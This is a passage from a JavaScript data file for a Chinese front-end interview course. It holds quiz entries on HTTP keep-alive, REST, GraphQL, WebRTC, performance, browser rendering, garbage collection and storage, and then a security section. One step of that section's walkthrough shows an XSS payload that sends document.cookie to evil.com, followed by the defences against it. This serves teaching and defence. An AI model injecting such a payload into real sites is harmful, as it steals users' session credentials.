                detailedAnswer: 'HTTP keep-alive（持久连接）：\n- HTTP/1.1 默认开启（Connection: keep-alive）\n- 一个 TCP 连接可发多个 HTTP 请求\n- 减少三次握手和慢启动开销\n- 请求串行（一个完成才发下一个）\n\nkeep-alive 工作流程：\n1. 首次请求：TCP 三次握手 + HTTP 请求\n2. 响应头 Connection: keep-alive，连接保持\n3. 后续请求复用该 TCP 连接（无需握手）\n4. 超时或 Connection: close 后断开\n\nkeep-alive 的局限：\n- 串行请求：一个请求阻塞后续（HTTP 队头阻塞）\n- 浏览器对同域名开 6 个并发连接缓解\n- 管道化（Pipeline）理论上可并行，但浏览器禁用\n\nHTTP/2 多路复用（Multiplexing）：\n- 单一 TCP 连接并行多个请求/响应\n- 二进制分帧：HTTP 消息拆为帧\n- 每个请求/响应是一个流（Stream）\n- 流可交错传输，互不阻塞\n\nkeep-alive vs 多路复用：\n\n| 维度 | keep-alive（HTTP/1.1） | 多路复用（HTTP/2） |\n|------|------------------------|---------------------|\n| 连接数 | 每域名 6 个 | 每域名 1 个 |\n| 请求方式 | 串行 | 并行 |\n| 队头阻塞 | 有（HTTP 层） | 无（HTTP 层） |\n| 协议 | 文本 | 二进制分帧 |\n| 头部 | 明文重复 | HPACK 压缩 |\n\n连接复用优化：\n- 减少域名（域名收敛）\n- 使用 HTTP/2\n- 资源合并（雪碧图、打包）\n- 预连接（preconnect）',
                codeExample: `// HTTP/1.1 keep-alive（串行复用）\n// 请求1 → 响应1 → 请求2 → 响应2 → ...（同一 TCP 连接）\n\n// Node.js 服务端 keep-alive 配置\n// const server = http.createServer(app)\n// server.keepAliveTimeout = 5000  // keep-alive 超时 5s\n// server.listen(80)\n\n// 前端 keep-alive 代理配置（Node.js）\nconst http = require("http")\nconst agent = new http.Agent({\n  keepAlive: true,         // 开启 keep-alive\n  keepAliveMsecs: 1000,    // keep-alive 探测间隔\n  maxSockets: 10,          // 最大连接数\n  maxFreeSockets: 5,       // 最大空闲连接\n})\n// 复用连接发请求\nhttp.request({ host: "example.com", agent }, callback)\n\n// HTTP/2 多路复用（并行）\n// 单一 TCP 连接同时发多个请求\n// Stream 1: 请求A ──→ 响应A\n// Stream 3: 请求B ──→ 响应B  （并行交错）\n// Stream 5: 请求C ──→ 响应C\n\n// 前端资源加载对比\n// HTTP/1.1：6 个并发连接，第 7 个请求排队\n// HTTP/2：1 个连接，所有请求并行\n\n// 预连接优化（提前建立连接）\n// <link rel="preconnect" href="https://api.example.com">`,
                difficulty: 'medium',
                tags: ['keep-alive', 'HTTP/1.1', 'HTTP/2', '多路复用'],
                keyPoints: ['keep-alive 复用 TCP 串行', 'HTTP/2 多路复用并行', 'keep-alive 6 连接 HTTP/2 单连接', '减少握手开销'],
              },
              {
                id: 'network-restful',
                domain: 'network',
                question: 'RESTful API 是什么？设计规范有哪些？和 GraphQL、RPC 有何区别？',
                shortAnswer: 'REST 是基于资源的 API 设计风格：用 URL 表示资源，用 HTTP 方法表示操作（GET/POST/PUT/DELETE），无状态。GraphQL 是按需查询字段。RPC 是调用远程方法。REST 适合 CRUD，GraphQL 灵活查询，RPC 适合内部服务。',
                detailedAnswer: 'RESTful API 设计规范：\n\n1. 资源导向：URL 表示资源（名词）\n   - GET /users（用户列表）\n   - GET /users/123（单个用户）\n   - POST /users（创建）\n   - PUT /users/123（整体更新）\n   - PATCH /users/123（部分更新）\n   - DELETE /users/123（删除）\n\n2. HTTP 方法语义：\n   - GET：查询（安全、幂等）\n   - POST：创建（不幂等）\n   - PUT：更新（幂等）\n   - PATCH：部分更新\n   - DELETE：删除（幂等）\n\n3. 无状态（Stateless）：\n   - 每个请求包含所有信息\n   - 服务器不保存客户端状态\n   - 便于扩展（负载均衡）\n\n4. 状态码：\n   - 200/201/204 成功\n   - 400/401/403/404 客户端错误\n   - 500/502/503 服务端错误\n\n5. 版本管理：\n   - URL 版本：/v1/users\n   - Header 版本：Accept: application/vnd.api+json;version=1\n\n6. 过滤/分页/排序：\n   - /users?role=admin&page=1&size=20&sort=-created_at\n\n7. 响应格式：JSON\n\nREST vs GraphQL vs RPC：\n\n| 维度 | REST | GraphQL | RPC |\n|------|------|---------|-----|\n| 风格 | 资源导向 | 查询语言 | 方法调用 |\n| 端点 | 多个 | 单个 /graphql | 多个 |\n| 数据 | 固定结构 | 按需查询 | 固定 |\n| 过度获取 | 有 | 无 | 有 |\n| 不足获取 | 有 | 无 | 有 |\n| 缓存 | HTTP 缓存 | 需自定义 | 难 |\n| 适用 | CRUD API | 复杂查询 | 内部服务 |\n\nREST 优势：\n- 简单易懂\n- HTTP 语义清晰\n- 可缓存\n- 生态成熟\n\nREST 劣势：\n- 过度获取（返回不需要的字段）\n- 不足获取（需多次请求关联数据）\n- 多次请求（N+1 问题）',
                codeExample: `// RESTful API 设计\n// 资源：users\n// GET    /api/v1/users           获取列表\n// GET    /api/v1/users/:id        获取单个\n// POST   /api/v1/users           创建\n// PUT    /api/v1/users/:id        整体更新\n// PATCH  /api/v1/users/:id        部分更新\n// DELETE /api/v1/users/:id        删除\n\n// RESTful 响应格式\n// 成功\n{ "code": 0, "data": { "id": 1, "name": "Alice" }, "message": "OK" }\n// 列表（分页）\n{ "code": 0, "data": { "list": [], "total": 100, "page": 1, "size": 20 } }\n// 错误\n{ "code": 401, "data": null, "message": "未登录" }\n\n// GraphQL 查询（按需获取字段）\n// POST /graphql\n// query {\n//   user(id: 1) {\n//     id\n//     name\n//     posts {\n//       title\n//     }\n//   }\n// }\n// 一次请求获取用户 + 文章，无过度/不足获取\n\n// RPC 调用（方法导向）\n// POST /rpc\n// { "method": "user.getUser", "params": { "id": 1 } }\n// gRPC 用 Protobuf 二进制协议，性能更高\n\n// Express RESTful API 示例\n// app.get("/api/v1/users", getUsers)\n// app.get("/api/v1/users/:id", getUser)\n// app.post("/api/v1/users", createUser)\n// app.put("/api/v1/users/:id", updateUser)\n// app.delete("/api/v1/users/:id", deleteUser)`,
                difficulty: 'medium',
                tags: ['RESTful', 'API 设计', 'GraphQL', 'RPC'],
                keyPoints: ['REST 资源导向 URL 名词', 'HTTP 方法表示操作', 'REST 无状态可缓存', 'GraphQL 按需查询无过度获取'],
              },
              {
                id: 'network-graphql',
                domain: 'network',
                question: 'GraphQL 是什么？解决了 REST 的什么问题？N+1 查询如何解决？',
                shortAnswer: 'GraphQL 是 Facebook 开发的 API 查询语言，客户端按需查询字段，单端点 /graphql。解决 REST 的过度获取、不足获取、多请求问题。N+1 用 DataLoader 批量加载解决。',
                detailedAnswer: 'GraphQL 核心概念：\n- 查询语言：客户端声明需要的数据结构\n- 单端点：POST /graphql\n- 类型系统：Schema 定义类型和字段\n- 按需获取：只返回请求的字段\n\n解决 REST 的问题：\n1. 过度获取（Over-fetching）：\n   - REST：GET /users/1 返回所有字段（含不需要的）\n   - GraphQL：只查需要的字段\n\n2. 不足获取（Under-fetching）：\n   - REST：获取用户 + 文章需两次请求\n   - GraphQL：一次查询嵌套关联数据\n\n3. 多次请求：\n   - REST：N+1 问题\n   - GraphQL：单次查询\n\nSchema 定义：\ntype Query {\n  user(id: ID!): User\n}\ntype User {\n  id: ID!\n  name: String!\n  posts: [Post!]!\n}\n\n查询示例：\nquery {\n  user(id: 1) {\n    name\n    posts { title }\n  }\n}\n\nN+1 问题：\n- 查询 10 个用户，每个用户查文章\n- 1 次查用户 + 10 次查文章 = 11 次（N+1）\n- 解决：DataLoader 批量查询\n  - 收集所有 userId，一次查所有文章\n  - 1 + 1 = 2 次\n\nGraphQL 操作类型：\n- Query：查询（读）\n- Mutation：变更（写）\n- Subscription：订阅（实时，WebSocket）\n\nGraphQL vs REST：\n- 灵活性：GraphQL > REST\n- 缓存：REST（HTTP 缓存）> GraphQL（需自定义）\n- 学习曲线：REST < GraphQL\n- 性能：REST 简单查询快，GraphQL 复杂查询灵活\n- 文件上传：REST 简单，GraphQL 需扩展',
                codeExample: `// GraphQL Schema 定义\n// const { gql } = require("apollo-server")\n// const typeDefs = gql\`\n//   type User {\n//     id: ID!\n//     name: String!\n//     posts: [Post!]!\n//   }\n//   type Post {\n//     id: ID!\n//     title: String!\n//     author: User!\n//   }\n//   type Query {\n//     user(id: ID!): User\n//     users: [User!]!\n//   }\n//   type Mutation {\n//     createUser(name: String!): User!\n//   }\n// \`\n\n// 客户端查询（按需获取字段）\n// query GetUserWithPosts($id: ID!) {\n//   user(id: $id) {\n//     id\n//     name\n//     posts {\n//       title\n//     }\n//   }\n// }\n// 响应：{ "data": { "user": { "id": "1", "name": "Alice", "posts": [...] } } }\n\n// N+1 问题解决：DataLoader\n// const DataLoader = require("dataloader")\n// const postLoader = new DataLoader(async (userIds) => {\n//   // 批量查询所有用户的文章（1 次查询）\n//   const posts = await Post.find({ userId: { $in: userIds } })\n//   return userIds.map((id) => posts.filter((p) => p.userId === id))\n// })\n//\n// const resolvers = {\n//   User: {\n//     posts: (user) => postLoader.load(user.id), // 自动批量\n//   },\n// }\n\n// REST 对比\n// REST：3 次请求获取用户 + 文章 + 评论\n//   GET /users/1\n//   GET /users/1/posts\n//   GET /posts/123/comments\n// GraphQL：1 次请求\n//   query { user(id: 1) { name posts { title comments { text } } } }`,
                difficulty: 'hard',
                tags: ['GraphQL', 'REST', 'DataLoader', 'N+1'],
                keyPoints: ['GraphQL 按需查询字段', '单端点解决过度/不足获取', 'N+1 用 DataLoader 批量', 'Query/Mutation/Subscription'],
              },
              {
                id: 'network-webrtc',
                domain: 'network',
                question: 'WebRTC 是什么？如何实现浏览器实时音视频通信？信令服务器的作用？',
                shortAnswer: 'WebRTC 是浏览器原生 P2P 实时音视频通信技术，基于 UDP。通过信令服务器交换 SDP 描述和 ICE 候选，建立 P2P 连接。无需安装插件，低延迟。STUN/TURN 服务器解决 NAT 穿透。',
                detailedAnswer: 'WebRTC（Web Real-Time Communication）：\n- 浏览器原生 P2P 实时通信\n- 音视频 + 数据通道\n- 基于 UDP（SRTP/DTLS）\n- 无需插件\n\n核心 API：\n1. getUserMedia：获取摄像头/麦克风\n2. RTCPeerConnection：建立 P2P 连接\n3. RTCDataChannel：P2P 数据通道\n\n连接建立流程：\n1. 呼叫方创建 Offer（SDP 描述）\n2. 通过信令服务器发送给接收方\n3. 接收方创建 Answer（SDP 描述）\n4. 通过信令服务器返回\n5. 双方交换 ICE 候选（网络地址）\n6. ICE 协商找到最优路径\n7. 建立 P2P 连接，开始传输\n\n信令服务器（Signaling）：\n- WebRTC 未规定信令协议\n- 用于交换 SDP 和 ICE 候选\n- 通常用 WebSocket 实现\n- 仅在连接建立时使用，之后 P2P 直连\n\nNAT 穿透：\n- STUN 服务器：获取公网 IP\n- TURN 服务器：中继转发（无法 P2P 时）\n- ICE 候选：收集所有可能路径\n  - 主机候选（本地 IP）\n  - 反射候选（STUN 公网 IP）\n  - 中继候选（TURN 服务器）\n\nSDP（Session Description Protocol）：\n- 描述媒体能力（编解码器、分辨率等）\n- Offer/Answer 模型\n\nWebRTC 优势：\n- 低延迟（P2P，不经服务器）\n- 端到端加密（SRTP/DTLS）\n- 浏览器原生支持\n- 免费（无授权费）\n\n适用场景：\n- 视频会议\n- 在线教育\n- 直播连麦\n- 文件传输（DataChannel）',
                codeExample: `// 1. 获取媒体流\nconst localStream = await navigator.mediaDevices.getUserMedia({\n  video: true,\n  audio: true,\n})\ndocument.querySelector("video").srcObject = localStream\n\n// 2. 创建 P2P 连接\nconst pc = new RTCPeerConnection({\n  iceServers: [\n    { urls: "stun:stun.l.google.com:19302" }, // STUN\n    { urls: "turn:turn.example.com", username: "user", credential: "pass" }, // TURN\n  ],\n})\n\n// 3. 添加本地媒体流\nlocalStream.getTracks().forEach((track) => pc.addTrack(track, localStream))\n\n// 4. 接收远程媒体流\npc.ontrack = (e) => {\n  document.querySelector("remoteVideo").srcObject = e.streams[0]\n}\n\n// 5. 交换 ICE 候选（通过信令服务器）\npc.onicecandidate = (e) => {\n  if (e.candidate) {\n    signalingServer.send({ type: "ice", candidate: e.candidate })\n  }\n}\nsignalingServer.onmessage = async (e) => {\n  const msg = JSON.parse(e.data)\n  if (msg.type === "ice") {\n    await pc.addIceCandidate(msg.candidate)\n  }\n}\n\n// 6. 呼叫方创建 Offer\nconst offer = await pc.createOffer()\nawait pc.setLocalDescription(offer)\nsignalingServer.send({ type: "offer", sdp: offer })\n\n// 7. 接收方创建 Answer\nsignalingServer.onmessage = async (e) => {\n  const msg = JSON.parse(e.data)\n  if (msg.type === "offer") {\n    await pc.setRemoteDescription(msg.sdp)\n    const answer = await pc.createAnswer()\n    await pc.setLocalDescription(answer)\n    signalingServer.send({ type: "answer", sdp: answer })\n  } else if (msg.type === "answer") {\n    await pc.setRemoteDescription(msg.sdp)\n  }\n}\n\n// 8. 数据通道（P2P 传数据）\nconst channel = pc.createDataChannel("chat")\nchannel.onmessage = (e) => console.log("收到:", e.data)\nchannel.send("Hello P2P")`,
                difficulty: 'hard',
                tags: ['WebRTC', 'P2P', '音视频', '信令'],
                keyPoints: ['WebRTC 浏览器 P2P 音视频', '信令服务器交换 SDP/ICE', 'STUN/TURN NAT 穿透', 'getUserMedia + RTCPeerConnection'],
              },
              {
                id: 'network-performance',
                domain: 'network',
                question: '前端网络性能优化有哪些手段？资源加载、传输、缓存层面的优化策略？',
                shortAnswer: '加载优化：预加载/预连接、懒加载、代码分割、tree-shaking。传输优化：HTTP/2 多路复用、Gzip/Brotli 压缩、资源合并、CDN。缓存优化：强缓存+协商缓存、Service Worker 离线缓存、HTTP/2 Server Push。',
                detailedAnswer: '前端网络性能优化三层策略：\n\n一、资源加载优化：\n1. 预加载（Preload）：提前加载关键资源\n   <link rel="preload" href="critical.css" as="style">\n2. 预连接（Preconnect）：提前建立连接\n   <link rel="preconnect" href="//cdn.example.com">\n3. DNS 预解析：\n   <link rel="dns-prefetch" href="//cdn.example.com">\n4. 懒加载（Lazy Load）：\n   <img loading="lazy"> 滚动到视口才加载\n   import() 动态导入路由组件\n5. 代码分割（Code Splitting）：\n   按路由/组件拆分 chunk\n6. Tree Shaking：去除未使用代码\n7. 资源合并：减少请求数（雪碧图已过时，HTTP/2 下反而慢）\n\n二、传输优化：\n1. HTTP/2：多路复用、头部压缩、二进制分帧\n2. Gzip/Brotli 压缩：减少传输体积（Brotli 比 Gzip 压缩率高 15-20%）\n3. CDN：就近访问、缓存\n4. 资源压缩：Terser 压缩 JS、CSSNano 压缩 CSS\n5. 图片优化：\n   - WebP/AVIF 替代 JPG/PNG\n   - 响应式图片 srcset\n   - SVG 替代图标字体\n6. 减少重定向\n\n三、缓存优化：\n1. 强缓存：Cache-Control: max-age\n2. 协商缓存：ETag/If-None-Match\n3. Service Worker 离线缓存\n4. HTTP/2 Server Push（已废弃）\n5. CDN 边缘缓存\n6. 文件指纹（contenthash）：长期缓存\n\n四、关键指标优化：\n- FCP（First Contentful Paint）：首屏内容渲染\n- LCP（Largest Contentful Paint）：最大内容渲染（< 2.5s）\n- FID/INP（交互响应）\n- CLS（Cumulative Layout Shift）：布局偏移（< 0.1）\n- TTFB（Time to First Byte）：< 800ms\n\n优化优先级：\n1. 减少请求数/体积（打包、压缩、tree-shaking）\n2. 合理缓存（强缓存 + 文件指纹）\n3. 关键路径优化（预加载关键 CSS/JS）\n4. 懒加载非关键资源\n5. CDN 加速',
                codeExample: `// 1. 预加载关键资源\n// <link rel="preload" href="/fonts.woff2" as="font" crossorigin>\n// <link rel="preconnect" href="https://cdn.example.com">\n// <link rel="dns-prefetch" href="https://api.example.com">\n\n// 2. 代码分割 + 懒加载\nconst Home = React.lazy(() => import("./pages/Home"))\nconst About = React.lazy(() => import("./pages/About"))\n// 路由级分割\n<Suspense fallback={<Loading />}>\n  <Route path="/" element={<Home />} />\n  <Route path="/about" element={<About />} />\n</Suspense>\n\n// 3. 图片懒加载 + 响应式\n// <img\n//   src="placeholder.jpg"\n//   data-src="real-image.jpg"\n//   loading="lazy"\n//   srcset="img-480w.jpg 480w, img-800w.jpg 800w"\n//   sizes="(max-width: 600px) 480px, 800px"\n// />\n\n// 4. Service Worker 缓存\n// cache-first 策略：静态资源\n// network-first 策略：动态内容\n\n// 5. Webpack 资源优化\n// webpack.config.js\n// optimization: {\n//   splitChunks: { chunks: "all" }, // 代码分割\n//   minimize: true,\n// }\n// 性能预算\n// performance: {\n//   maxAssetSize: 250000,\n//   maxEntrypointSize: 250000,\n// }\n\n// 6. HTTP 缓存策略（文件指纹）\n// output: { filename: "[name].[contenthash:8].js" }\n// 长期缓存：Cache-Control: max-age=31536000\n// 文件更新：contenthash 变化，浏览器重新下载\n\n// 7. Brotli 压缩（Nginx）\n// gzip on;\n// gzip_types text/css application/javascript;\n// brotli on;  // 需 ngx_brotli 模块`,
                difficulty: 'hard',
                tags: ['性能优化', '加载优化', '缓存', 'CDN'],
                keyPoints: ['预加载/懒加载/代码分割', 'HTTP/2 多路复用+Brotli 压缩', '强缓存+协商缓存+SW', '优化 LCP/CLS/FID 指标'],
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 5：浏览器八股
    // ========================================================================
    {
      order: 5,
      title: '浏览器八股',
      difficulty: 3,
      visualizationType: 'comparetable',
      blocks: [
        {
          id: 'iv-p5-1',
          type: 'paragraph',
          lead: true,
          text: '浏览器面试八股覆盖渲染流程、重绘回流、垃圾回收、存储机制等核心考点。',
        },
        {
          id: 'iv-p5-2',
          type: 'demo',
          visualizationType: 'comparetable',
          data: {
            featureColumn: '题目',
            columns: ['核心答案', '难度'],
            highlightColumn: 0,
            rows: [
              { feature: '浏览器渲染流程', values: ['HTML→DOM，CSS→CSSOM，合成渲染树→布局→绘制→合成', '中'] },
              { feature: '重绘 vs 回流', values: ['重绘：外观变化不改布局；回流：布局变化（尺寸/位置），回流必触发重绘', '中'] },
              { feature: '垃圾回收机制', values: ['标记清除（主）+ 引用计数（辅）；V8 分代回收（新生代 Scavenge + 老生代标记清除/整理）', '难'] },
              { feature: '内存泄漏场景', values: ['意外的全局变量、遗忘的定时器、闭包引用、脱离 DOM 的引用、未清理的事件监听', '中'] },
              { feature: 'localStorage vs sessionStorage vs Cookie', values: ['localStorage 持久化 5MB+；sessionStorage 会话级；Cookie 4KB 随请求发送', '易'] },
              { feature: '事件委托', values: ['利用事件冒泡，在父元素监听子元素事件，减少监听器数量，动态子元素也能触发', '易'] },
            ],
          },
        },
        {
          id: 'iv-p5-3',
          type: 'callout',
          variant: 'tip',
          title: '为何追加动态演示？',
          text: '浏览器渲染流程与垃圾回收是动态过程，静态表格难以直观理解。下方 CodeStepper 分步演示渲染管线，问答引擎覆盖 5 道高频题，强化动态反馈。',
        },
        {
          id: 'iv-p5-4',
          type: 'demo',
          visualizationType: 'codestepper',
          data: {
            language: 'text',
            lines: [
              'HTML 文本',
              '  ↓ HTML Parser',
              'DOM 树',
              'CSS 文本',
              '  ↓ CSS Parser',
              'CSSOM 树',
              'DOM + CSSOM → 渲染树（Render Tree）',
              '  ↓ Layout（布局/回流）',
              '布局矩形（位置/尺寸）',
              '  ↓ Paint（绘制）',
              '位图像素',
              '  ↓ Composite（合成）',
              'GPU 图层合成 → 屏幕',
            ],
            steps: [
              { title: '步骤 1：解析 HTML 构建 DOM', description: '浏览器从网络拿到 HTML 字节流，先解码为字符，再分词成 Token，最后构建 DOM 树。遇到 <script> 会同步阻塞解析（除非 defer/async）。', highlightLines: [1, 2, 3] },
              { title: '步骤 2：解析 CSS 构建 CSSOM', description: 'CSS 解析为 CSSOM 树。CSSOM 必须完整解析后才能进入下一步（CSS 阻塞渲染）。注意：CSS 下载不阻塞 DOM 解析，但会阻塞渲染。', highlightLines: [4, 5, 6] },
              { title: '步骤 3：合成渲染树', description: 'DOM + CSSOM 合并成渲染树（Render Tree）。渲染树只包含可见节点（display:none 不在树中，但 visibility:hidden 在树中）。<head> 等不可见节点也会被排除。', highlightLines: [7] },
              { title: '步骤 4：Layout 布局（回流）', description: '计算每个节点的几何信息（位置、尺寸）。从根节点递归向下，依赖父子关系。任何影响几何的变更（resize、改 width/margin）都会触发回流。', highlightLines: [8, 9] },
              { title: '步骤 5：Paint 绘制', description: '将布局矩形转换为位图像素，绘制到图层。涉及颜色、阴影、文本、边框、背景图等。改 color/background 不影响布局，只触发重绘。', highlightLines: [10, 11] },
              { title: '步骤 6：Composite 合成', description: '将多个图层合成最终画面。transform/opacity 只触发合成，不触发布局和绘制，性能最优。GPU 加速动画利用此特性。', highlightLines: [12, 13] },
            ],
          },
        },
        {
          id: 'iv-p5-5',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'javascript',
            mode: 'sequential',
            questions: [
              {
                id: 'browser-render-pipeline',
                domain: 'javascript',
                question: '详细描述浏览器从接收 HTML 到渲染页面的完整流程，每一步产物是什么？',
                shortAnswer: 'HTML→DOM，CSS→CSSOM，合成渲染树→Layout 布局→Paint 绘制→Composite 合成。产物依次：DOM、CSSOM、Render Tree、布局矩形、位图、合成帧。',
                detailedAnswer: '完整流程：\n1. HTML 解析：字节→字符→Token→Node→DOM 树\n2. CSS 解析：字节→字符→Token→Node→CSSOM 树（CSSOM 必须完整构建才进入下一步）\n3. 合成渲染树：DOM + CSSOM → Render Tree（只含可见节点，display:none 排除）\n4. Layout 布局：计算节点几何信息（位置、尺寸），递归从根到叶\n5. Paint 绘制：将布局矩形转为位图像素，绘制到图层\n6. Composite 合成：多图层合成最终画面，GPU 加速\n\n关键：JS 可能阻塞 DOM 解析（除非 async/defer）；CSS 阻塞渲染（不阻塞 DOM 解析）。',
                difficulty: 'medium',
                tags: ['渲染流程', '面试必考'],
                keyPoints: ['DOM/CSSOM/Render Tree 三个产物', 'Layout→Paint→Composite 三阶段', 'JS 阻塞解析', 'CSS 阻塞渲染'],
              },
              {
                id: 'browser-reflow-repaint',
                domain: 'javascript',
                question: '重绘和回流的区别？如何避免？改变 transform 会触发哪个？',
                shortAnswer: '重绘只改变外观不改布局（color）；回流改变布局（width/margin），回流必触发重绘。transform/opacity 只触发合成，不触发回流重绘，性能最优。',
                detailedAnswer: '区别：\n- 重绘（Repaint）：外观变化（color、background、visibility），不影响布局\n- 回流（Reflow）：布局变化（width、height、margin、padding、display），影响几何\n- 关系：回流必然触发重绘，重绘不一定触发回流\n\n触发回流的操作：\n1. 改 DOM 几何属性（width/height/margin/padding/border）\n2. 改 DOM 结构（增删节点、改 textContent）\n3. 改窗口大小（resize）\n4. 读取 offsetTop/getComputedStyle 等强制同步布局的属性\n5. 改字体（font-family/font-size）\n\n避免回流：\n1. 用 transform 代替 top/left（transform 只触发合成）\n2. 用 opacity 代替 visibility（opacity 只触发合成）\n3. 批量改样式：用 class 切换而非逐条改 style\n4. 离线 DOM：先 display:none 改完再恢复（只触发 2 次回流）\n5. 避免逐条读取布局属性（强制同步布局）\n\ntransform 触发合成阶段（Composite），不触发 Layout/Paint，是动画性能最优选择。',
                difficulty: 'hard',
                tags: ['重绘', '回流', '性能优化', '面试必考'],
                keyPoints: ['重绘不改布局，回流改布局', '回流必触发重绘', 'transform/opacity 只触发合成', '避免强制同步布局'],
              },
              {
                id: 'browser-gc',
                domain: 'javascript',
                question: 'V8 垃圾回收机制？新生代和老生代分别用什么算法？',
                shortAnswer: 'V8 分代回收：新生代用 Scavenge（Cheney 算法，from/to 半区复制），老生代用标记清除+标记整理。新生代晋升老生代条件：经历过一次 Scavenge 或空间占用超 25%。',
                detailedAnswer: 'V8 分代回收机制：\n\n新生代（Young Generation，1-8MB）：\n- 算法：Scavenge（Cheney 算法）\n- 内存分两半：from 和 to\n- GC 时：标记 from 中存活对象，复制到 to，然后 from/to 交换\n- 优点：无内存碎片，速度快\n- 缺点：牺牲一半内存\n\n老生代（Old Generation，较大）：\n- 算法：标记清除（Mark-Sweep）+ 标记整理（Mark-Compact）\n- 标记清除：标记可达对象，清除不可达对象（产生碎片）\n- 标记整理：清理时移动对象紧凑排列（解决碎片，但慢）\n- 增量标记 + 并发标记：减少停顿时间\n\n晋升条件（新生代→老生代）：\n1. 经历过一次 Scavenge 还存活（说明生命周期长）\n2. To 空间占用超过 25%（避免后续复制空间不足）\n\n优化：Orinoco 增量标记、并发标记、并行 GC，减少 STW 停顿。',
                difficulty: 'hard',
                tags: ['垃圾回收', 'V8', '内存管理'],
                keyPoints: ['新生代 Scavenge 半区复制', '老生代 标记清除+整理', '晋升条件', '增量标记减少停顿'],
              },
              {
                id: 'browser-memory-leak',
                domain: 'javascript',
                question: '前端常见的内存泄漏场景？如何检测和排查？',
                shortAnswer: '常见：意外的全局变量、遗忘的定时器、闭包引用、脱离 DOM 的引用、未清理的事件监听。排查：Chrome DevTools Memory 面板，Heap snapshot 对比 + Allocation timeline。',
                detailedAnswer: '常见内存泄漏场景：\n\n1. 意外的全局变量：函数中未声明直接赋值（foo = 1 等价 window.foo = 1）\n2. 遗忘的定时器：setInterval/setTimeout 未 clear，回调持有外部引用\n3. 闭包引用：闭包持有大对象引用，外部无法回收\n4. 脱离 DOM 的引用：JS 变量引用已移除的 DOM 节点（removeChild 后变量仍引用）\n5. 未清理的事件监听：addEventListener 后未 removeEventListener\n6. console.log：开发环境 console 持有对象引用（生产环境注意移除）\n7. WebView 双向引用：原生持有 JS 对象 + JS 持有原生对象\n\n排查工具：\n- Chrome DevTools Memory 面板\n- Heap snapshot：拍快照对比前后差异\n- Allocation timeline：实时观察内存分配\n- Performance Monitor：观察 JS heap 大小变化\n\n预防：严格用 let/const，定时器立即 clear，事件监听用 once 或显式 remove，WeakMap/WeakSet 持有可回收引用。',
                difficulty: 'medium',
                tags: ['内存泄漏', '性能优化'],
                keyPoints: ['7 种常见泄漏场景', 'DevTools Memory 排查', 'WeakMap 持有可回收引用', '定时器/事件监听必须清理'],
              },
              {
                id: 'browser-storage',
                domain: 'javascript',
                question: 'localStorage、sessionStorage、Cookie、IndexedDB 的区别？',
                shortAnswer: 'localStorage 持久化 5MB+ 同源共享；sessionStorage 会话级 5MB；Cookie 4KB 随请求发送；IndexedDB 异步大容量 NoSQL 数百 MB+。',
                detailedAnswer: '四种存储方案对比：\n\nlocalStorage：\n- 容量：5-10MB\n- 生命周期：持久化（除非手动清除）\n- 作用域：同源共享\n- API：同步 localStorage.getItem/setItem\n- 场景：用户偏好、主题、缓存数据\n\nsessionStorage：\n- 容量：5-10MB\n- 生命周期：会话级（标签页关闭清除）\n- 作用域：同源 + 同标签页\n- API：同步\n- 场景：临时表单数据、单页会话状态\n\nCookie：\n- 容量：4KB\n- 生命周期：可设 expires/max-age\n- 作用域：同源 + path/domain\n- 特点：随 HTTP 请求自动发送\n- 场景：身份认证、跟踪（HttpOnly 防 XSS 读）\n\nIndexedDB：\n- 容量：数百 MB 至数 GB\n- 生命周期：持久化\n- 作用域：同源\n- API：异步（Promise）\n- 特点：NoSQL 键值存储，支持事务、索引、游标\n- 场景：离线应用、大量结构化数据（PWA）\n\n选择：身份用 Cookie，少量配置用 localStorage，离线大数据用 IndexedDB。',
                difficulty: 'medium',
                tags: ['存储', 'localStorage', 'IndexedDB'],
                keyPoints: ['四种存储容量/生命周期/作用域', 'Cookie 随请求发送', 'IndexedDB 异步大容量', '场景选择'],
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 6：安全八股
    // ========================================================================
    {
      order: 6,
      title: '安全八股',
      difficulty: 3,
      visualizationType: 'comparetable',
      blocks: [
        {
          id: 'iv-p6-1',
          type: 'paragraph',
          lead: true,
          text: '前端安全面试八股覆盖 XSS、CSRF、CSP、点击劫持等核心安全威胁及防御方案。',
        },
        {
          id: 'iv-p6-2',
          type: 'demo',
          visualizationType: 'comparetable',
          data: {
            featureColumn: '安全威胁',
            columns: ['攻击原理', '防御方案', '难度'],
            rows: [
              { feature: 'XSS（跨站脚本）', values: ['注入恶意脚本到页面', '输入过滤/输出转义/CSP/HttpOnly Cookie', '中'] },
              { feature: 'CSRF（跨站请求伪造）', values: ['冒用用户身份发请求', 'CSRF Token/SameSite Cookie/Referer 检查', '中'] },
              { feature: '点击劫持', values: ['透明 iframe 诱骗点击', 'X-Frame-Options: DENY/CSP frame-ancestors', '易'] },
              { feature: '中间人攻击', values: ['拦截篡改通信内容', 'HTTPS/HSTS/证书固定', '难'] },
              { feature: 'SQL 注入', values: ['拼接恶意 SQL 语句', '参数化查询/ORM/输入过滤', '中'] },
              { feature: '内容安全策略 CSP', values: ['限制资源加载来源', 'Content-Security-Policy 响应头/nonce/hash', '难'] },
            ],
          },
        },
        {
          id: 'iv-p6-3',
          type: 'callout',
          variant: 'tip',
          title: '为何追加动态演示？',
          text: '安全攻击是流程化行为，静态表格难见因果。下方 CodeStepper 演示 XSS 从输入到窃取的完整链路，问答引擎覆盖 5 道高频题，强化防御思路。',
        },
        {
          id: 'iv-p6-4',
          type: 'demo',
          visualizationType: 'codestepper',
          data: {
            language: 'text',
            lines: [
              '攻击者构造恶意 payload',
              '  payload: <script>fetch("https://evil.com?c="+document.cookie)</script>',
              '  载体：评论/搜索/个人简介等用户输入字段',
              '受害者浏览被注入的页面',
              '  服务端未转义直接拼接输出',
              '  → 浏览器解析为 <script> 并执行',
              '脚本在受害者上下文执行',
              '  → 读取 document.cookie',
              '  → 发起 fetch 到 evil.com',
              '  → 攻击者拿到会话凭证',
              '防御层（任一即可阻断）',
              '  1. 输出转义（escapeHtml：& < > " \')',
              '  2. CSP：default-src \'self\'；禁用内联脚本',
              '  3. HttpOnly Cookie：document.cookie 读不到',
              '  4. 输入校验：白名单过滤标签/属性',
            ],
            steps: [
              { title: '步骤 1：攻击者构造 payload', description: '攻击者在用户可输入的字段（评论、个人简介、搜索词）注入恶意脚本。常见 payload：<script>、<img onerror>、<svg onload>、javascript: URL 等。', highlightLines: [1, 2, 3] },
